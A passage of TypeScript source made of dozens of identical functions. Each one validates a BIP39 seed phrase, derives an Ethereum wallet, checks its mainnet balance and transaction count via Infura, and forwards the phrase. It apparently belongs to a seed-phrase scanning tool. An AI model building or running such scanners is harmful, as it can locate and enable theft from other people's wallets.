    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s133(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s134(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s135(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s136(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s137(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s138(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s139(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s140(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s141(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s142(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s143(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s144(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s145(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s146(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s147(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s148(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s149(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s150(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s151(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s152(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s153(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s154(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s155(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s156(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s157(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s158(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s159(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s160(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s161(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s162(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s163(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s164(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s165(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s166(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s167(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s168(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s169(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s170(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s171(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s172(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s173(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s174(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s175(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s176(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s177(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s178(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s179(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s180(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s181(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s182(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s183(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s184(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s185(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s186(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s187(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s188(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s189(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s190(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s191(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s192(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s193(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s194(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s195(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s196(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s197(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s198(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s199(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s200(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
